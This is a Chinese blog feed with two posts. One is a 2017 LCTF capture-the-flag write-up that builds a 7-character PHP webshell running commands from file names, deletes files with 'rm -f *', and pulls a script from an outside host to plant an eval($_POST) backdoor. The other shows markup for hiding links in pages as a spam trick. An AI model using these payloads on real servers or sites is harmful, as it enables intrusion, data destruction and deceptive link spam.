    <title>随手笔记</title>
    <link href="http://www.cuittk.cn/2018/11/10/%E9%9A%8F%E6%89%8B%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.cuittk.cn/2018/11/10/随手笔记/</id>
    <published>2018-11-10T09:12:33.897Z</published>
    <updated>2018-11-10T09:12:33.898Z</updated>
    
    <content type="html"><![CDATA[<h3 id="2017-LCTF-“他们”有什么秘密呢"><a href="#2017-LCTF-“他们”有什么秘密呢" class="headerlink" title="2017-LCTF-“他们”有什么秘密呢?"></a>2017-LCTF-“他们”有什么秘密呢?</h3><p>到第二关，可以在沙箱里创建任意名字的文件, webshell被限制在7个字符里, 很容易找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?=`*`</div></pre></td></tr></table></figure></p><p>这样的webshell, 然后通过执行本地文件名字的命令拿到shell，但是默认有index.html</p><p>两种方法：<br>1.默认有index.html 使用bash命令查看目录，查看flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">创建 bash</div><div class="line">1</div><div class="line"></div><div class="line">创建 bb</div><div class="line">ls /</div><div class="line"></div><div class="line">创建z.php</div><div class="line">&lt;?=`*`;</div><div class="line">&gt;访问 z.php</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/5jd27hm6wm6lxnjjbvfjnwvkro.png" alt=""><br>将bb 内容改为 cat /3* ,再访问z.php<br><img src="http://img.cdn.cuittk.cn/ynb09cmgupiudkhskyoiba3ot7.png" alt=""></p><p>2.删除index.html  webshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">创建 z.php</div><div class="line">&lt;?=`*`;</div><div class="line"></div><div class="line">创建 b</div><div class="line">rm -f *</div><div class="line"></div><div class="line">创建 bash</div><div class="line">1</div><div class="line">&gt;访问z.php //实现删除文件</div><div class="line"></div><div class="line">创建 z.php</div><div class="line">&lt;?=`*`;</div><div class="line"></div><div class="line">创建 www1.cuittk.cn //index.html内容为: echo &quot;&lt;?php eval(\$_POST[h]);?&gt;&quot;&gt;shell.php</div><div class="line">1</div><div class="line">&gt;访问 z.php //下载了index.html</div><div class="line"></div><div class="line">创建bash</div><div class="line">1</div><div class="line">&gt;访问z.php,执行bash脚本生成shell.php</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/ahhoe46cbcxo5kizhh0xyr8xs9.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;2017-LCTF-“他们”有什么秘密呢&quot;&gt;&lt;a href=&quot;#2017-LCTF-“他们”有什么秘密呢&quot; class=&quot;headerlink&quot; title=&quot;2017-LCTF-“他们”有什么秘密呢?&quot;&gt;&lt;/a&gt;2017-LCTF-“他们”有什么秘密呢?&lt;/h3
      
    
    </summary>
    
    
      <category term="summary" scheme="http://www.cuittk.cn/tags/summary/"/>
    
  </entry>
  
  <entry>
    <title>链接</title>
    <link href="http://www.cuittk.cn/2018/11/10/%E9%93%BE%E6%8E%A5/"/>
    <id>http://www.cuittk.cn/2018/11/10/链接/</id>
    <published>2018-11-10T09:12:33.848Z</published>
    <updated>2019-11-11T17:14:10.465Z</updated>
    
    <content type="html"><![CDATA[<p>你看不见我，看不见我，不见我，见我，我，，，</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>写法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;div style=&quot;display:none;&quot;&gt;</div><div class="line">&lt;a href=&quot;http://www.example.com&quot;&gt;test&lt;/a&gt;</div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure></p><p>写法二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;marquee height=1 width=5 scrollamount=3000 scrolldelay=20000&gt; </div><div class="line">&lt;a href=http://www.example.com&gt;test&lt;/a&gt;&lt;/marquee&gt;</div></pre></td></tr></table></figure></p><p>写法三：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;NOSCRIPT&gt; </div><div class="line">&lt;a herf=http://www.example.com style=&quot;color:#FFFFFF;font-size:1px;line-height:1px;&quot;&gt;test&lt;/a&gt; </div><div class="line">&lt;/NOSCRIPT&gt;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;你看不见我，看不见我，不见我，见我，我，，，&lt;/p&gt;
&lt;h3 id=&quot;链接&quot;&gt;&lt;a href=&quot;#链接&quot; class=&quot;headerlink&quot; title=&quot;链接&quot;&gt;&lt;/a&gt;链接&lt;/h3&gt;&lt;p&gt;写法一：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;
      
    
    </summary>
    
      <category term="href" scheme="http://www.cuittk.cn/categories/href/"/>
    
    
      <category term="href" scheme="http://www.cuittk.cn/tags/href/"/>
    
  </entry>
  
</feed>
